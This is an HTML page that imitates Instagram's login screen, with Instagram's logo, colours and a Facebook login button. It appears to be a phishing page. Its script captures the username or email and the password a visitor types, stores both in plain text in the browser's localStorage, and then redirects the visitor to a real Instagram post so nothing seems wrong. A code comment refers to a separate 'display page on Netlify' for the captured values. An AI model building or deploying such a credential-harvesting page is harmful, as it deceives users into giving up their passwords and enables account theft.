<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            padding: 20px;
            text-align: center;
        }
        .login-container img {
            width: 200px;
            margin-bottom: 10px;
        }
        .login-container input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .password-wrapper {
            position: relative;
        }
        .password-wrapper input {
            width: 100%;
            padding-right: 50px;
        }
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 14px;
            color: #0095f6;
        }
        .forgot-password {
            text-align: right;
            margin-top: -3px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .forgot-password a {
            color: #0095f6;
            text-decoration: none;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #007bb5;
        }
        .login-container .footer {
            margin-top: 10px;
            font-size: 14px;
            color: #999;
        }
        .login-container .footer a {
            color: #0095f6;
            text-decoration: none;
        }
        .login-container .footer a:hover {
            text-decoration: underline;
        }
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ddd;
        }
        .divider:not(:empty)::before {
            margin-right: 10px;
        }
        .divider:not(:empty)::after {
            margin-left: 10px;
        }
        .fb-login {
            background-color: #4267B2;
            color: #fff;
            font-size: 14px;
            padding: 10px;
            border: none;
            border-radius: 5px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 15px;
        }
        .fb-login:hover {
            background-color: #365899;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="Instagram Logo">
        
        <button class="fb-login" onclick="window.location.href='https://www.facebook.com/login'">Continue Using Facebook</button>

        <div class="divider">OR</div>
        
        <form id="loginForm">
            <div class="password-wrapper">
                <input type="text" id="usernameOrEmail" placeholder="Phone number, username, or email" required>
            </div>
            <div class="password-wrapper">
                <input type="password" id="password" placeholder="Password" required>
                <span id="togglePassword" class="toggle-password">Show</span>
            </div>
            <div class="forgot-password">
                <a href="#">Forgotten your password?</a>
            </div>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
    <script>
        // Toggle password visibility
        document.getElementById('togglePassword').addEventListener('click', function() {
            const passwordField = document.getElementById('password');
            const toggleText = this;
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                passwordField.type = 'password';
                toggleText.textContent = 'Show';
            }
        });

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Get the input values
            const usernameOrEmail = document.getElementById('usernameOrEmail').value;
            const password = document.getElementById('password').value;

            // Store the values in localStorage
            localStorage.setItem('usernameOrEmail', usernameOrEmail);
            localStorage.setItem('password', password);

            // Redirect to the display page on Netlify
            window.location.href = 'https://www.instagram.com/p/C-t8mpYtj1B/?igsh=bWZxNmZydTE0OGxk'; // Update this URL
        });
    </script>
</body>
</html>
